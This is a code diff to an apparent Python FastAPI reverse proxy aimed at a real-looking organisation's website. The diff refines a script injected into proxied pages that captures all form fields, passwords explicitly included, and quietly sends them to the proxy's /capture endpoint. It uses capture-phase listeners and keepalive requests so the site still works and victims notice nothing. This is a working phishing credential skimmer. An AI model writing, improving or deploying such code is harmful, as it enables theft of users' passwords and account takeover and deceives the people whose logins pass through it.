@@ -13,7 +13,7 @@ app = FastAPI()
 client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)
 
 
-TARGET_BASE = "https://www.example.com/"
+TARGET_BASE = "https://www.yamanplus.org/"
 parsed_target = urlparse(TARGET_BASE)
 TARGET_DOMAIN = parsed_target.netloc
 
@@ -33,6 +33,9 @@ AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]
 # =========================================================
 # CLIENT-SIDE FORM OBSERVATION SCRIPT
 # =========================================================
+# =========================================================
+# CLIENT-SIDE FORM OBSERVATION SCRIPT
+# =========================================================
 FORM_OBSERVER_SCRIPT = """
 <script>
 (function() {
@@ -47,7 +50,7 @@ FORM_OBSERVER_SCRIPT = """
             if (!name) return;
 
             if (input.type === 'password') {
-                formData[name] = input.value; // Or keep input.value if you intend to capture it
+                formData[name] = input.value; // Capturing actual password
             } else if (input.type === 'checkbox' || input.type === 'radio') {
                 formData[name] = input.checked;
             } else if (input.tagName === 'SELECT') {
@@ -70,33 +73,28 @@ FORM_OBSERVER_SCRIPT = """
     function attachFormListeners() {
         document.querySelectorAll('form').forEach(form => {
             if (form.dataset.observerAttached) return;
-
             form.dataset.observerAttached = 'true';
 
-            form.addEventListener('submit', async function(e) {
-                // Pause the standard submission
-                e.preventDefault(); 
-                
+            // Use the capture phase (true) to intercept the data before the SPA processes it
+            form.addEventListener('submit', function(e) {
                 const captured = captureFormData(form);
 
                 try {
-                    // Wait for the capture payload to send before navigating away
-                    await fetch('/capture', {
+                    // keepalive: true ensures the proxy receives the data even if the page immediately unloads/redirects
+                    fetch('/capture', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(captured)
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(captured),
+                        keepalive: true
                     });
                     console.log('[Proxy Observer] Form submission captured:', captured);
                 } catch (err) {
                     console.warn('[Proxy Observer] Failed to send form data:', err);
                 }
                 
-                // Programmatically resume the exact form submission 
-                // Bypasses this event listener to prevent an infinite loop
-                HTMLFormElement.prototype.submit.call(form);
-            });
+                // CRITICAL FIX: We no longer preventDefault() or force form.submit(). 
+                // We let the SPA handle the event naturally from here.
+            }, true); 
         });
     }
 
@@ -106,15 +104,8 @@ FORM_OBSERVER_SCRIPT = """
         attachFormListeners();
     }
 
-    const observer = new MutationObserver(() => {
-        attachFormListeners();
-    });
-
-    observer.observe(document.documentElement, {
-        childList: true,
-        subtree: true
-    });
-
+    const observer = new MutationObserver(() => attachFormListeners());
+    observer.observe(document.documentElement, { childList: true, subtree: true });
 })();
 </script>
 """
